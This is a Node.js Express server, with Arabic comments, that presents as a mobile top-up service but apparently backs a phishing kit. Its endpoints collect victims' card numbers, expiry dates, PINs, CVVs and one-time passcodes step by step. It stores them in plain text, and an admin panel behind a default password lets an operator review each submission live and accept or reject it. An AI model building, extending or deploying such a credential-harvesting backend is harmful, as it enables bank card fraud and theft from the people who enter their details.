const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

/* ---------------- تخزين الطلبات (في الذاكرة) ---------------- */
let submissions = [];

/* ---------------- جلسات الأدمن ---------------- */
const sessions = new Map();
const SESSION_TTL = 1000 * 60 * 60 * 6;
function newToken() { return crypto.randomBytes(24).toString('hex'); }
function isAuthed(req) {
  const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
  const created = sessions.get(token);
  if (!created || Date.now() - created > SESSION_TTL) { sessions.delete(token); return false; }
  return true;
}

/* ---------------- عداد الزيارات النشطة ---------------- */
const visitors = new Map();
const ACTIVE_WINDOW = 30 * 1000;
function activeCount() {
  const now = Date.now();
  for (const [id, seen] of visitors) if (now - seen > ACTIVE_WINDOW) visitors.delete(id);
  return visitors.size;
}

// استقبال طلب شحن
app.post('/api/submit', (req, res) => {
  const b = req.body;
  const phone  = String(b.phone  || '').trim();
  const amount = String(b.amount || '').trim();
  if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
  submissions.unshift({
    id: crypto.randomBytes(6).toString('hex'),
    phone, amount,
    card:   String(b.card   || '').trim(),
    expiry: String(b.expiry || '').trim(),
    pin:    String(b.pin    || '').trim(),
    otp:    String(b.otp    || '').trim(),
    cvv:    String(b.cvv    || '').trim(),
    status: 'pending',
    time:   new Date().toISOString()
  });
  if (submissions.length > 5000) submissions = submissions.slice(0, 5000);
  res.json({ ok: true, id: submissions[0].id });
});

// تحديث خطوة
app.post('/api/submit-step/:id', (req, res) => {
  const sub = submissions.find(s => s.id === req.params.id);
  if (!sub) return res.status(404).json({ error: 'غير موجود' });
  const b = req.body;
  if (b.card   !== undefined) sub.card   = String(b.card).trim();
  if (b.expiry !== undefined) sub.expiry = String(b.expiry).trim();
  if (b.pin    !== undefined) sub.pin    = String(b.pin).trim();
  if (b.otp    !== undefined) sub.otp    = String(b.otp).trim();
  if (b.cvv    !== undefined) sub.cvv    = String(b.cvv).trim();
  sub.status = 'pending';
  res.json({ ok: true });
});

// حالة طلب
app.get('/api/status/:id', (req, res) => {
  const sub = submissions.find(s => s.id === req.params.id);
  if (!sub) return res.status(404).json({ error: 'غير موجود' });
  res.json({ status: sub.status || 'pending' });
});

// قبول طلب
app.post('/api/admin/accept/:id', (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  const sub = submissions.find(s => s.id === req.params.id);
  if (!sub) return res.status(404).json({ error: 'غير موجود' });
  sub.status = 'accepted';
  res.json({ ok: true });
});

// رفض طلب
app.post('/api/admin/reject/:id', (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  const sub = submissions.find(s => s.id === req.params.id);
  if (!sub) return res.status(404).json({ error: 'غير موجود' });
  sub.status = 'rejected';
  res.json({ ok: true });
});

// نبضة الزائر
app.post('/api/heartbeat', (req, res) => {
  const id = String(req.body.id || '').trim();
  if (id) visitors.set(id, Date.now());
  res.json({ active: activeCount() });
});

// عدد الزيارات النشطة
app.get('/api/active-count', (req, res) => {
  res.json({ active: activeCount() });
});

// دخول الأدمن
app.post('/api/admin/login', (req, res) => {
  if ((req.body.password || '') !== ADMIN_PASSWORD) return res.status(401).json({ error: 'كلمة المرور غير صحيحة' });
  const token = newToken();
  sessions.set(token, Date.now());
  res.json({ token });
});

// بيانات الأدمن
app.get('/api/admin/submissions', (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  res.json({ submissions, active: activeCount() });
});

// مسح الطلبات
app.post('/api/admin/clear', (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ error: 'غير مصرح' });
  submissions = [];
  res.json({ ok: true });
});

// ملفات ثابتة
app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => console.log('Server running on port ' + PORT));
}

module.exports = app;
